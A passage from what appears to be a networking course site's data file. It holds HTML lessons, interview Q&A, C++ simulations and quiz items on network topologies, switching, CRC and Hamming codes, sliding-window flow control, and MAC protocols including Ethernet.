predominantly use <b>star topology</b> with Ethernet switches at the center. Data centers use <b>spine-leaf</b> (a form of partial mesh/fat-tree) for predictable latency and high bandwidth.</p></div><div class="learn-section"><div class="learn-h">Switching Techniques</div><p class="learn-p">Switching determines how data moves from source to destination across a network.</p><table class="learn-table"><tr><th>Feature</th><th>Circuit Switching</th><th>Packet Switching</th><th>Message Switching</th></tr><tr><td>Connection</td><td>Dedicated path established before data transfer</td><td>No dedicated path; packets routed independently</td><td>No dedicated path; entire message stored-and-forwarded</td></tr><tr><td>Setup delay</td><td>Yes (path must be established)</td><td>No</td><td>No</td></tr><tr><td>Bandwidth</td><td>Reserved (wasted if idle)</td><td>Shared dynamically</td><td>Shared dynamically</td></tr><tr><td>Latency</td><td>Constant after setup</td><td>Variable (queuing delays)</td><td>High (store full message at each hop)</td></tr><tr><td>Reliability</td><td>Path failure breaks connection</td><td>Packets rerouted around failures</td><td>Message rerouted around failures</td></tr><tr><td>Order</td><td>In order (single path)</td><td>May arrive out of order</td><td>In order per message</td></tr><tr><td>Example</td><td>Traditional telephone (PSTN)</td><td>Internet (IP)</td><td>Email relay (legacy)</td></tr></table><p class="learn-p"><b>Packet switching sub-types:</b></p><ul class="learn-list"><li><b>Datagram (connectionless):</b> Each packet routed independently. No setup. Packets may take different paths and arrive out of order. Example: UDP/IP.</li><li><b>Virtual circuit (connection-oriented):</b> A logical path is established before data transfer. All packets follow the same path. Setup required but lower per-packet overhead. Example: ATM, MPLS, Frame Relay.</li></ul></div><div class="learn-section"><div class="learn-h">Network Devices by OSI Layer</div><table class="learn-table"><tr><th>Device</th><th>OSI Layer</th><th>Operates On</th><th>Function</th></tr><tr><td>Hub (Repeater)</td><td>Layer 1 (Physical)</td><td>Bits</td><td>Broadcasts to all ports. No intelligence. Creates a single collision domain.</td></tr><tr><td>Switch (Bridge)</td><td>Layer 2 (Data Link)</td><td>Frames (MAC addresses)</td><td>Forwards to specific port using MAC table. Each port is a separate collision domain.</td></tr><tr><td>Router</td><td>Layer 3 (Network)</td><td>Packets (IP addresses)</td><td>Routes between networks. Each interface is a separate broadcast domain.</td></tr></table><div class="learn-code">Hub:    All ports = 1 collision domain, 1 broadcast domain\nSwitch: Each port = separate collision domain, 1 broadcast domain\nRouter: Each interface = separate collision domain AND broadcast domain\n\nCollision domain: area where frames can collide\nBroadcast domain: area where a broadcast reaches all devices</div><div class="learn-tip"><b>Tip:</b> A switch with N ports creates N collision domains (one per port) but only 1 broadcast domain. A router separates broadcast domains. VLANs on a switch can also create separate broadcast domains at Layer 2.</div></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Compare single-mode and multi-mode fiber optic cable.</b><br>A: Single-mode has a small core (~9 &mu;m), uses laser light, supports distances up to 100+ km with no modal dispersion — used in WANs and backbone links. Multi-mode has a larger core (~50-62.5 &mu;m), uses LED/VCSEL, supports up to ~2 km but suffers from modal dispersion — used in LANs and data centers. Single-mode is more expensive but essential for long-haul.</p><p class="learn-p"><b>Q2: Why does star topology dominate modern LANs?</b><br>A: Star topology provides easy fault isolation (one cable failure affects only one device), simple addition/removal of devices, and when used with a switch (not hub), eliminates collisions entirely. The only weakness is the central switch being a single point of failure, which is mitigated with redundant switches.</p><p class="learn-p"><b>Q3: What is the difference between a hub, a switch, and a router?</b><br>A: A hub operates at Layer 1 and broadcasts all frames to all ports — creating one large collision domain. A switch operates at Layer 2 and uses a MAC address table to forward frames only to the correct port — each port is a separate collision domain. A router operates at Layer 3 and routes packets between different networks using IP addresses — each interface is a separate broadcast domain.</p><p class="learn-p"><b>Q4: Why do some HFT firms prefer microwave over fiber for inter-exchange links?</b><br>A: Microwaves travel at the speed of light in air (~3 x 10^8 m/s) whereas light in fiber travels at ~2 x 10^8 m/s due to the refractive index of glass. This ~33% speed advantage translates to microseconds of latency savings on routes like Chicago-to-New Jersey, which is significant in high-frequency trading.</p><p class="learn-p"><b>Q5: How many links are needed in a full mesh topology with n nodes? Why is full mesh impractical for large networks?</b><br>A: Full mesh requires n(n-1)/2 links. For 10 nodes that is 45 links; for 100 nodes, 4950 links. The O(n^2) growth makes full mesh impractical for large networks. Instead, partial mesh or spine-leaf architectures connect only critical nodes fully, balancing redundancy with cost.</p></div>',
          code: `// === Topology & Switching Simulation in C++ ===
#include <iostream>
#include <vector>
#include <queue>
#include <cmath>
using namespace std;

// --- Mesh Topology Link Calculator ---
int fullMeshLinks(int n) {
    return n * (n - 1) / 2;
}

// --- Adjacency list graph for topology simulation ---
class Network {
    int nodes;
    vector<vector<int>> adj;
public:
    Network(int n) : nodes(n), adj(n) {}

    void addLink(int u, int v) {
        adj[u].push_back(v);
        adj[v].push_back(u);
    }

    // Build star topology: node 0 is the center
    void buildStar() {
        for (int i = 1; i < nodes; i++) {
            addLink(0, i);
        }
    }

    // Build ring topology
    void buildRing() {
        for (int i = 0; i < nodes; i++) {
            addLink(i, (i + 1) % nodes);
        }
    }

    // Build full mesh
    void buildFullMesh() {
        for (int i = 0; i < nodes; i++)
            for (int j = i + 1; j < nodes; j++)
                addLink(i, j);
    }

    // Build bus topology (linear chain)
    void buildBus() {
        for (int i = 0; i < nodes - 1; i++) {
            addLink(i, i + 1);
        }
    }

    // BFS to check connectivity and find shortest path
    int shortestPath(int src, int dst) {
        vector<int> dist(nodes, -1);
        queue<int> q;
        dist[src] = 0;
        q.push(src);
        while (!q.empty()) {
            int u = q.front(); q.pop();
            if (u == dst) return dist[u];
            for (int v : adj[u]) {
                if (dist[v] == -1) {
                    dist[v] = dist[u] + 1;
                    q.push(v);
                }
            }
        }
        return -1; // unreachable
    }

    int countLinks() {
        int total = 0;
        for (auto& neighbors : adj) total += neighbors.size();
        return total / 2; // each link counted twice
    }

    void printStats(const string& name) {
        cout << name << " Topology (" << nodes << " nodes):" << endl;
        cout << "  Links: " << countLinks() << endl;
        cout << "  Path 1->last: " << shortestPath(1, nodes - 1) << " hops" << endl;
    }
};

// --- Collision / Broadcast domain calculator ---
void domainAnalysis(int switchPorts, int routerInterfaces) {
    cout << "\\n=== Domain Analysis ===" << endl;
    // Hub: 1 collision domain, 1 broadcast domain
    cout << "Hub (" << switchPorts << " ports): "
         << "1 collision domain, 1 broadcast domain" << endl;
    // Switch: N collision domains, 1 broadcast domain
    cout << "Switch (" << switchPorts << " ports): "
         << switchPorts << " collision domains, 1 broadcast domain" << endl;
    // Router: N collision + N broadcast domains
    cout << "Router (" << routerInterfaces << " interfaces): "
         << routerInterfaces << " collision domains, "
         << routerInterfaces << " broadcast domains" << endl;
}

int main() {
    // Mesh link calculations
    cout << "=== Full Mesh Links ===" << endl;
    for (int n : {5, 10, 20, 50, 100}) {
        cout << "  n=" << n << ": " << fullMeshLinks(n) << " links" << endl;
    }

    // Topology simulations
    cout << "\\n=== Topology Simulations ===" << endl;
    int n = 8;

    Network star(n);
    star.buildStar();
    star.printStats("Star");

    Network ring(n);
    ring.buildRing();
    ring.printStats("Ring");

    Network mesh(n);
    mesh.buildFullMesh();
    mesh.printStats("Full Mesh");

    Network bus(n);
    bus.buildBus();
    bus.printStats("Bus");

    // Domain analysis
    domainAnalysis(24, 4);

    // Fiber comparison
    cout << "\\n=== Fiber Latency Comparison ===" << endl;
    double distance = 1000e3; // 1000 km in meters
    double fiberSpeed = 2e8;  // m/s in fiber
    double airSpeed = 3e8;    // m/s in air (microwave)
    double fiberDelay = distance / fiberSpeed * 1000; // ms
    double airDelay = distance / airSpeed * 1000;     // ms
    cout << "  Distance: 1000 km" << endl;
    cout << "  Fiber latency:     " << fiberDelay << " ms" << endl;
    cout << "  Microwave latency: " << airDelay << " ms" << endl;
    cout << "  Savings:           " << fiberDelay - airDelay << " ms" << endl;

    return 0;
}`,
          problems: [
            ['Twisted Pair Cable Categories','https://www.geeksforgeeks.org/twisted-pair-cable/','Easy'],
            ['Fiber Optic — Single vs Multi Mode','https://www.geeksforgeeks.org/fiber-optics-and-types/','Easy'],
            ['Network Topologies Comparison','https://www.geeksforgeeks.org/types-of-network-topology/','Easy'],
            ['Circuit Switching vs Packet Switching','https://www.geeksforgeeks.org/difference-between-circuit-switching-and-packet-switching/','Medium'],
            ['Hub vs Switch vs Router','https://www.geeksforgeeks.org/difference-between-hub-switch-and-router/','Medium'],
          ],
          mcqs: [
            {q: 'CAT6a cable supports a maximum data rate of:', o: ['100 Mbps', '1 Gbps', '10 Gbps', '40 Gbps'], a: 2},
            {q: 'Total internal reflection in fiber optics requires:', o: ['Core refractive index less than cladding', 'Core refractive index greater than cladding', 'Equal refractive indices', 'No cladding'], a: 1},
            {q: 'Modal dispersion is a problem in:', o: ['Single-mode fiber', 'Multi-mode fiber', 'Coaxial cable', 'Twisted pair'], a: 1},
            {q: 'In a full mesh topology with 10 nodes, the number of links is:', o: ['10', '20', '45', '90'], a: 2},
            {q: 'A switch operates at which OSI layer?', o: ['Layer 1', 'Layer 2', 'Layer 3', 'Layer 4'], a: 1},
            {q: 'Which topology has the highest fault tolerance?', o: ['Bus', 'Star', 'Ring', 'Full Mesh'], a: 3},
            {q: 'A hub creates how many collision domains for 8 ports?', o: ['1', '8', '16', '0'], a: 0},
            {q: 'Microwave communication requires:', o: ['No special requirements', 'Line-of-sight between antennas', 'Fiber optic cable', 'Twisted pair wiring'], a: 1},
          ],
        }
      ]
    },
    // ==================== TAB 2: Data Link Layer (OSI Layer 2) ====================
    {
      id: 'dl', t: 'Data Link Layer',
      topics: [
        {
          t: 'Error Detection & Flow Control',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Imagine downloading a critical financial report over a noisy wireless link. A single flipped bit in a dollar amount — say changing $1,000,000 to $3,000,000 — could cause catastrophic errors. <b>Error detection</b> at the Data Link layer catches these corruptions before they propagate. <b>Flow control</b> ensures a fast sender does not overwhelm a slow receiver, which is critical in high-frequency trading systems where data bursts are common. Understanding CRC, Hamming codes, and sliding window protocols is essential for both networking interviews and systems design.</p></div><div class="learn-section"><div class="learn-h">Introduction to Error Detection</div><p class="learn-p">When data is transmitted over a physical medium (copper wire, fiber, wireless), <b>noise and interference</b> can corrupt bits. The <b>Data Link Layer</b> is responsible for detecting (and sometimes correcting) these errors before passing data up to the Network Layer. Error detection ensures <b>data integrity</b> at the frame level.</p><p class="learn-p">There are two broad strategies: <b>Error Detection</b> (detect and request retransmission) and <b>Error Correction</b> (detect and fix without retransmission, also called <b>Forward Error Correction / FEC</b>). In practice, most wired networks rely on detection + retransmission, while wireless or satellite links may use FEC due to high latency.</p></div><div class="learn-section"><div class="learn-h">Types of Errors</div><ul class="learn-list"><li><b>Single-bit error:</b> Only one bit in the data unit is flipped. Rare in serial transmission but possible.</li><li><b>Burst error:</b> Two or more consecutive bits are corrupted. More common in real-world channels. The <b>burst length</b> is from the first to the last corrupted bit.</li></ul></div><div class="learn-section"><div class="learn-h">Error Detection Techniques</div><p class="learn-p"><b>1. Parity Check (Single Bit Parity):</b></p><p class="learn-p">A <b>parity bit</b> is appended to the data. In <b>even parity</b>, the total number of 1s (data + parity) is made even. In <b>odd parity</b>, it is made odd.</p><div class="learn-code">Data: 1011001  (four 1s — even count)\nEven Parity Bit: 0  &rarr; 10110010  (still four 1s)\nOdd Parity Bit:  1  &rarr; 10110011  (five 1s)</div><p class="learn-p">Single-bit parity can detect <b>odd number of bit errors</b> but fails for even number of errors. It cannot correct errors.</p><p class="learn-p"><b>2. Two-Dimensional Parity:</b></p><p class="learn-p">Data is arranged in a matrix. Parity is computed for each row AND each column. This can detect <b>all single-bit, double-bit, and all triple-bit errors</b>. It can also <b>correct single-bit errors</b> by identifying the row and column intersection.</p><div class="learn-code">Data Matrix:        Row Parity:\n1 0 1 1  |  1\n0 1 1 0  |  0\n1 1 0 1  |  1\n---------+\n0 0 0 0    (column parity)</div><p class="learn-p"><b>3. Checksum:</b></p><p class="learn-p">Used at the Transport layer (TCP/UDP) and also at the Network layer (IP header checksum). The sender divides data into fixed-size segments, sums them using <b>1\'s complement arithmetic</b>, and sends the complement of the sum as the checksum. The receiver adds all segments + checksum; if the result is all 1s, no error is detected.</p><div class="learn-code">Segments: 10011001, 11100010, 00100100\nSum (1\'s complement): 10011001 + 11100010 = 101111011\nWrap carry: 01111100\nAdd next:   01111100 + 00100100 = 10100000\nChecksum = complement = 01011111</div><div class="learn-warn"><b>Warning:</b> Checksum can miss errors where two segments have complementary bit flips that cancel out in the sum. CRC is more robust for link-layer error detection.</div><p class="learn-p"><b>4. Cyclic Redundancy Check (CRC):</b></p><p class="learn-p">CRC is the <b>most widely used</b> error detection method at the Data Link layer (used in Ethernet, Wi-Fi, USB, etc.). It treats the bit string as a polynomial and divides it by a <b>generator polynomial</b>. The remainder is appended to the data as the CRC code.</p><div class="learn-code">Data:       1101011011  (message M)\nGenerator:  10011       (polynomial G, degree 4)\n\nStep 1: Append (degree of G) zeros to M:\n        11010110110000\nStep 2: Divide by G using XOR (modulo-2 division)\nStep 3: Remainder = 1110  (this is the CRC)\nStep 4: Transmit: 11010110111110\n\nReceiver divides received data by G.\nIf remainder = 0, no error detected.</div><p class="learn-p">CRC can detect: all single-bit errors, all double-bit errors (if G has at least 3 terms), all odd number of errors (if G contains x+1 as factor), and all burst errors of length up to the CRC degree.</p><div class="learn-tip"><b>Tip:</b> Common CRC polynomials: CRC-8, CRC-16, CRC-32 (used in Ethernet with generator 0x04C11DB7). CRC-32 can detect any burst error of length &le; 32.</div></div><div class="learn-section"><div class="learn-h">Hamming Code (Error Correction)</div><p class="learn-p">Hamming code is a <b>Forward Error Correction (FEC)</b> technique that can <b>detect up to 2-bit errors and correct 1-bit errors</b>. It uses <b>redundant parity bits</b> placed at positions that are powers of 2 (1, 2, 4, 8, ...).</p><p class="learn-p">For a data word of <b>m</b> bits, we need <b>r</b> redundant bits such that <code>2^r &ge; m + r + 1</code>. Each parity bit covers specific bit positions based on the binary representation of the position number.</p><div class="learn-code">Example: Data = 1011 (4 bits, need r=3 parity bits)\nPositions: P1 P2 D1 P4 D2 D3 D4\n            _  _  1  _  0  1  1\n\nP1 covers positions with bit 0 set: 1,3,5,7  &rarr; P1=1^0^1 = 0\nP2 covers positions with bit 1 set: 2,3,6,7  &rarr; P2=1^1^1 = 1\nP4 covers positions with bit 2 set: 4,5,6,7  &rarr; P4=0^1^1 = 0\n\nHamming code: 0 1 1 0 0 1 1</div></div><div class="learn-section"><div class="learn-h">Flow Control</div><p class="learn-p">Flow control ensures the <b>sender does not overwhelm the receiver</b> with data faster than it can process. At the Data Link layer, flow control is managed between adjacent nodes (hop-by-hop). The main protocols are:</p><p class="learn-p"><b>1. Stop-and-Wait Protocol:</b></p><ul class="learn-list"><li>Sender sends one frame, then waits for ACK.</li><li>After receiving ACK, sends the next frame.</li><li>Simple but <b>very inefficient</b> — utilization = <code>1 / (1 + 2a)</code> where <code>a = propagation delay / transmission delay</code>.</li><li>Uses a <b>timeout</b> for retransmission if ACK is lost.</li><li>Sequence numbers 0 and 1 (alternating bit protocol) to handle duplicate frames.</li></ul><div class="learn-code">Efficiency = T_trans / (T_trans + 2 * T_prop)\n           = 1 / (1 + 2a)    where a = T_prop / T_trans\n\nExample: Frame size = 1000 bits, Link = 1 Mbps, Prop delay = 5 ms\nT_trans = 1000 / 10^6 = 1 ms\na = 5 / 1 = 5\nEfficiency = 1 / (1 + 10) = 9.09%  (very low!)</div><p class="learn-p"><b>2. Sliding Window Protocols:</b></p><p class="learn-p">To improve utilization, we allow the sender to transmit <b>multiple frames</b> before waiting for ACKs. The <b>window size (W)</b> determines how many unacknowledged frames can be in flight.</p><div class="learn-code">Efficiency = min(1, W / (1 + 2a))    for W frames\n\nWith W = 11 and a = 5:\nEfficiency = 11 / 11 = 100%!</div><p class="learn-p"><b>Go-Back-N (GBN):</b></p><ul class="learn-list"><li>Sender window size = W, Receiver window size = 1.</li><li>If frame <code>i</code> is lost, receiver discards all subsequent frames. Sender retransmits from frame <code>i</code> onward.</li><li>Sequence number bits n: <code>W &le; 2^n - 1</code>.</li><li>Cumulative ACKs — ACK(n) acknowledges all frames up to n.</li></ul><p class="learn-p"><b>Selective Repeat (SR):</b></p><ul class="learn-list"><li>Sender window size = W, Receiver window size = W.</li><li>Receiver buffers out-of-order frames. Only the lost frame is retransmitted.</li><li>Sequence number bits n: <code>W &le; 2^(n-1)</code>.</li><li>Individual (selective) ACKs.</li></ul><div class="learn-tip"><b>Tip:</b> Interview favorite: "Why is the max window size for GBN = 2^n - 1 but for SR = 2^(n-1)?" Because in SR, receiver and sender windows can overlap in sequence number space, causing ambiguity. The constraint W &le; 2^(n-1) prevents this.</div></div><div class="learn-section"><div class="learn-h">Piggybacking</div><p class="learn-p">In full-duplex communication, <b>piggybacking</b> means attaching an ACK to an outgoing data frame instead of sending a separate ACK frame. This improves bandwidth utilization by reducing the number of frames on the network.</p></div><div class="learn-section"><div class="learn-h">Comparison Table</div><table class="learn-table"><tr><th>Feature</th><th>Stop-and-Wait</th><th>Go-Back-N</th><th>Selective Repeat</th></tr><tr><td>Sender Window</td><td>1</td><td>W (up to 2^n - 1)</td><td>W (up to 2^(n-1))</td></tr><tr><td>Receiver Window</td><td>1</td><td>1</td><td>W</td></tr><tr><td>Retransmission</td><td>Single frame</td><td>All from lost frame</td><td>Only lost frame</td></tr><tr><td>ACK Type</td><td>Individual</td><td>Cumulative</td><td>Individual</td></tr><tr><td>Complexity</td><td>Low</td><td>Medium</td><td>High</td></tr><tr><td>Efficiency</td><td>Low</td><td>Medium</td><td>High</td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Compare CRC with parity check and checksum. Which is most robust?</b><br>A: Parity can detect odd numbers of bit errors but misses even numbers. Checksum (1\'s complement sum) can miss complementary errors that cancel out. CRC treats data as a polynomial and uses modulo-2 division; it catches all single-bit, all double-bit, all odd-bit, and all burst errors of length up to the CRC degree. CRC-32 (used in Ethernet) is the most robust of the three.</p><p class="learn-p"><b>Q2: Why is the maximum window size for Go-Back-N = 2^n - 1 but for Selective Repeat = 2^(n-1)?</b><br>A: In GBN, the receiver window is 1 so there\'s no ambiguity between new and retransmitted frames as long as sender window &le; 2^n - 1. In SR, both sender and receiver have window size W. If W were too large, the receiver could mistake retransmitted frames for new ones when sequence numbers wrap around. The constraint sender_W + receiver_W &le; 2^n, with both equal, gives W &le; 2^(n-1).</p><p class="learn-p"><b>Q3: What is the efficiency of Stop-and-Wait when propagation delay is 10x the transmission delay?</b><br>A: Efficiency = 1/(1 + 2a) where a = t_prop/t_trans = 10. So efficiency = 1/21 = 4.76%. This shows Stop-and-Wait is very inefficient on high-latency links.</p><p class="learn-p"><b>Q4: How does Hamming code correct single-bit errors?</b><br>A: Parity bits at positions 1, 2, 4, 8, etc. each cover specific bit positions. On receiving, the receiver recalculates each parity bit. The positions where parity fails form a binary number pointing to the error position. For example, if P1 and P4 fail, the error is at position 1+4 = 5.</p><p class="learn-p"><b>Q5: What is piggybacking in flow control?</b><br>A: In full-duplex communication, instead of sending a separate ACK frame, the acknowledgment is attached to an outgoing data frame headed in the reverse direction. This reduces the number of frames on the network and improves bandwidth utilization.</p></div>',
          code: `// === CRC and Sliding Window Simulation in C++ ===
#include <iostream>
#include <string>
#include <vector>
#include <queue>
using namespace std;

// ---- CRC Computation ----
string xorStrings(string a, string b) {
    string result;
    for (int i = 1; i < (int)b.size(); i++) {
        result += (a[i] == b[i]) ? '0' : '1';
    }
    return result;
}

string computeCRC(string data, string generator) {
    int genLen = generator.size();
    // Append (genLen - 1) zeros to data
    string augmented = data + string(genLen - 1, '0');

    // Initial dividend
    string temp = augmented.substr(0, genLen);

    for (int i = genLen; i <= (int)augmented.size(); i++) {
        // If leading bit is 1, XOR with generator; else XOR with zeros
        if (temp[0] == '1') {
            temp = xorStrings(temp, generator);
        } else {
            temp = xorStrings(temp, string(genLen, '0'));
        }
        if (i < (int)augmented.size()) {
            temp += augmented[i];
        }
    }
    return temp; // This is the CRC remainder
}

void demonstrateCRC() {
    string data = "1101011011";
    string generator = "10011";

    string crc = computeCRC(data, generator);
    string transmitted = data + crc;

    cout << "=== CRC Computation ===" << endl;
    cout << "Data:        " << data << endl;
    cout << "Generator:   " << generator << endl;
    cout << "CRC:         " << crc << endl;
    cout << "Transmitted: " << transmitted << endl;

    // Verify at receiver
    string recvCRC = computeCRC(transmitted, generator);
    cout << "Receiver remainder: " << recvCRC;
    bool allZero = true;
    for (char c : recvCRC) if (c != '0') allZero = false;
    cout << (allZero ? " (No error)" : " (Error detected!)") << endl;
}

// ---- Stop-and-Wait Simulation ----
void stopAndWait(int totalFrames) {
    cout << "\\n=== Stop-and-Wait Protocol ===" << endl;
    int seq = 0;
    for (int i = 0; i < totalFrames; i++) {
        cout << "Sender: Send Frame " << i << " (seq=" << seq << ")" << endl;
        // Simulate: assume ACK received
        cout << "Receiver: ACK " << seq << " received" << endl;
        seq = 1 - seq; // alternate 0 and 1
    }
}

// ---- Go-Back-N Simulation ----
void goBackN(int totalFrames, int windowSize, int lostFrame) {
    cout << "\\n=== Go-Back-N (W=" << windowSize
         << ", lost frame=" << lostFrame << ") ===" << endl;
    int base = 0, nextSeq = 0;

    while (base < totalFrames) {
        // Send up to window size
        while (nextSeq < base + windowSize && nextSeq < totalFrames) {
            cout << "Sender: Send Frame " << nextSeq << endl;
            nextSeq++;
        }
        // Simulate ACKs
        if (base == lostFrame) {
            cout << "** Frame " << lostFrame << " LOST! **" << endl;
            cout << "Timeout! Retransmit from frame " << base << endl;
            nextSeq = base; // go back to base
            lostFrame = -1; // don't lose again
        } else {
            cout << "Receiver: ACK " << base << endl;
            base++;
        }
    }
    cout << "All " << totalFrames << " frames delivered." << endl;
}

// ---- Selective Repeat Simulation ----
void selectiveRepeat(int totalFrames, int windowSize, int lostFrame) {
    cout << "\\n=== Selective Repeat (W=" << windowSize
         << ", lost frame=" << lostFrame << ") ===" << endl;
    vector<bool> acked(totalFrames, false);
    int base = 0;

    // Send initial window
    for (int i = 0; i < min(windowSize, totalFrames); i++) {
        cout << "Sender: Send Frame " << i << endl;
    }

    // Simulate ACKs (all except lost frame)
    for (int i = 0; i < min(windowSize, totalFrames); i++) {
        if (i == lostFrame) {
            cout << "** Frame " << lostFrame << " LOST! **" << endl;
        } else {
            cout << "Receiver: ACK " << i << endl;
            acked[i] = true;
        }
    }
    // Retransmit only lost frame
    cout << "Timeout for frame " << lostFrame << " -> Retransmit" << endl;
    cout << "Sender: Resend Frame " << lostFrame << endl;
    acked[lostFrame] = true;
    cout << "Receiver: ACK " << lostFrame << endl;
    cout << "Window slides forward." << endl;
}

int main() {
    demonstrateCRC();
    stopAndWait(4);
    goBackN(8, 4, 2);
    selectiveRepeat(8, 4, 1);
    return 0;
}`,
          problems: [
            ['CRC Calculation Practice', 'https://www.geeksforgeeks.org/cyclic-redundancy-check-python/', 'Medium'],
            ['Hamming Code Problem', 'https://www.geeksforgeeks.org/hamming-code-in-computer-network/', 'Medium'],
            ['Sliding Window Maximum (LeetCode 239)', 'https://leetcode.com/problems/sliding-window-maximum/', 'Hard'],
            ['Checksum vs CRC Comparison', 'https://www.geeksforgeeks.org/difference-between-checksum-and-crc/', 'Easy'],
            ['Flow Control Efficiency Numericals', 'https://www.geeksforgeeks.org/stop-and-wait-arq/', 'Medium']
          ],
          mcqs: [
            {q: 'In Go-Back-N, if the sequence number field is 4 bits, what is the maximum sender window size?', o: ['16', '15', '8', '7'], a: 1},
            {q: 'Which error detection method is used in Ethernet frames?', o: ['Parity Check', 'Checksum', 'CRC-32', 'Hamming Code'], a: 2},
            {q: 'In Selective Repeat, the maximum window size with n-bit sequence numbers is:', o: ['2^n', '2^n - 1', '2^(n-1)', '2^(n-1) - 1'], a: 2},
            {q: 'CRC can detect all burst errors of length:', o: ['Equal to the CRC degree', 'Less than the CRC degree', 'Less than or equal to the CRC degree', 'Greater than the CRC degree'], a: 2},
            {q: 'The efficiency of Stop-and-Wait protocol is:', o: ['1 / (1 + a)', '1 / (1 + 2a)', 'W / (1 + 2a)', 'W / (1 + a)'], a: 1},
            {q: 'Hamming code with r redundant bits can correct errors in data of up to how many bits?', o: ['2^r', '2^r - 1', '2^r - r - 1', '2^r + r'], a: 2},
            {q: 'In 2D parity, the minimum number of bit errors that can go undetected is:', o: ['2', '3', '4', '5'], a: 2},
            {q: 'Piggybacking improves efficiency by:', o: ['Sending multiple frames at once', 'Attaching ACK to outgoing data frames', 'Increasing window size', 'Compressing frame headers'], a: 1}
          ],
        },
        {
          t: 'MAC Protocols & Ethernet',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Every time your laptop connects to a Wi-Fi network in a crowded office, dozens of devices compete for the same wireless channel. The <b>MAC sublayer</b> decides who gets to transmit and when, preventing chaos from simultaneous transmissions. Understanding CSMA/CD explains why Ethernet has a 64-byte minimum frame size, and CSMA/CA explains why your Wi-Fi throughput drops in crowded environments. These concepts appear frequently in networking interviews and are fundamental to understanding LAN performance.</p></div><div class="learn-section"><div class="learn-h">Introduction to MAC (Medium Access Control)</div><p class="learn-p">When multiple devices share a common communication channel (e.g., a bus topology, wireless medium), we need a mechanism to decide <b>who gets to transmit and when</b>. The <b>MAC sublayer</b> of the Data Link Layer handles this. MAC protocols are critical for avoiding <b>collisions</b> — situations where two or more stations transmit simultaneously, corrupting each other\'s signals.</p><p class="learn-p">MAC protocols are broadly classified into three categories:</p><ol class="learn-list"><li><b>Random Access (Contention-based):</b> Any station can transmit at any time. Collisions are possible and handled. Examples: ALOHA, CSMA, CSMA/CD, CSMA/CA.</li><li><b>Controlled Access:</b> Stations take turns or get permission. Examples: Polling, Token Passing, Reservation.</li><li><b>Channelization:</b> The channel is divided among stations. Examples: FDMA, TDMA, CDMA.</li></ol></div><div class="learn-section"><div class="learn-h">ALOHA Protocols</div><p class="learn-p"><b>Pure ALOHA:</b> Stations transmit whenever they have data. If a collision occurs (detected by lack of ACK), the station waits a <b>random backoff time</b> and retransmits.</p><div class="learn-code">Vulnerable period = 2 * T_frame\nMax throughput = 1/(2e) ≈ 18.4% at load G = 0.5\nS = G * e^(-2G)</div><p class="learn-p"><b>Slotted ALOHA:</b> Time is divided into slots equal to one frame transmission time. Stations can only transmit at the <b>beginning of a slot</b>. This halves the vulnerable period.</p><div class="learn-code">Vulnerable period = T_frame  (halved!)\nMax throughput = 1/e ≈ 36.8% at load G = 1.0\nS = G * e^(-G)</div><div class="learn-tip"><b>Tip:</b> Slotted ALOHA doubles the throughput of Pure ALOHA by reducing the vulnerable period. This is a very common numerical question in interviews.</div></div><div class="learn-section"><div class="learn-h">CSMA (Carrier Sense Multiple Access)</div><p class="learn-p">CSMA improves on ALOHA by having stations <b>listen to the channel before transmitting</b> ("carrier sensing"). If the channel is busy, the station defers. There are three persistence strategies:</p><ul class="learn-list"><li><b>1-Persistent CSMA:</b> If channel is idle, transmit immediately. If busy, keep sensing and transmit as soon as it becomes idle. High collision probability.</li><li><b>Non-Persistent CSMA:</b> If channel is busy, wait a random time before sensing again. Lower collision rate but higher delay.</li><li><b>p-Persistent CSMA:</b> If channel is idle, transmit with probability <b>p</b> and defer with probability <b>1-p</b>. Balances throughput and delay.</li></ul></div><div class="learn-section"><div class="learn-h">CSMA/CD (Collision Detection) — Ethernet</div><p class="learn-p">Used in <b>wired Ethernet (IEEE 802.3)</b>. Stations sense the medium AND <b>detect collisions while transmitting</b>. If a collision is detected, the station aborts transmission, sends a <b>jam signal</b>, and uses <b>Binary Exponential Backoff (BEB)</b> to determine retry time.</p><div class="learn-code">CSMA/CD Algorithm:\n1. Sense channel. If idle, transmit.\n2. If busy, wait until idle, then transmit.\n3. While transmitting, monitor for collision.\n4. If collision detected:\n   a. Send JAM signal (48 bits).\n   b. Increment attempt counter n.\n   c. Choose random k from [0, 2^min(n,10) - 1].\n   d. Wait k * slot_time, then go to step 1.\n5. After 16 failed attempts, report failure.</div><p class="learn-p"><b>Minimum frame size constraint:</b> For collision detection to work, a frame must be long enough that the sender is still transmitting when the collision signal arrives back. This gives us:</p><div class="learn-code">Min frame size = 2 * propagation_delay * bandwidth\n\nFor Ethernet (10 Mbps, max 2500m, prop speed ≈ 2*10^8 m/s):\nRTT = 2 * 2500 / (2*10^8) = 25 &mu;s\nWith repeater delays and safety margins: slot time = 51.2 &mu;s\nMin frame = 51.2 &mu;s * 10 Mbps = 512 bits = 64 bytes\n\nThis is why Ethernet has a minimum frame size of 64 bytes!</div><div class="learn-warn"><b>Warning:</b> CSMA/CD does NOT work in wireless networks because of the <b>hidden terminal problem</b> — a station may not be able to hear another distant station\'s transmission. Wireless uses CSMA/CA instead.</div></div><div class="learn-section"><div class="learn-h">CSMA/CA (Collision Avoidance) — Wi-Fi</div><p class="learn-p">Used in <b>wireless networks (IEEE 802.11)</b>. Since wireless stations cannot easily detect collisions, CSMA/CA tries to <b>avoid</b> them using:</p><ul class="learn-list"><li><b>IFS (Inter-Frame Spacing):</b> Mandatory gap between frames.</li><li><b>Contention Window:</b> Random backoff before transmitting.</li><li><b>RTS/CTS handshake:</b> Request to Send / Clear to Send mechanism to reserve the channel and solve the hidden terminal problem.</li><li><b>ACK:</b> Receiver sends ACK; if no ACK, sender retransmits.</li></ul></div><div class="learn-section"><div class="learn-h">Ethernet (IEEE 802.3)</div><p class="learn-p">Ethernet is the <b>most widely used LAN technology</b>. Modern Ethernet typically uses <b>switches</b> (not hubs), creating point-to-point full-duplex links where CSMA/CD is no longer needed.</p><p class="learn-p"><b>Ethernet Frame Format:</b></p><div class="learn-code">| Preamble | SFD | Dst MAC | Src MAC | Type/Len | Payload   | FCS  |\n| 7 bytes  | 1B  | 6 bytes | 6 bytes | 2 bytes  | 46-1500 B | 4B   |\n\nPreamble:  7 bytes of 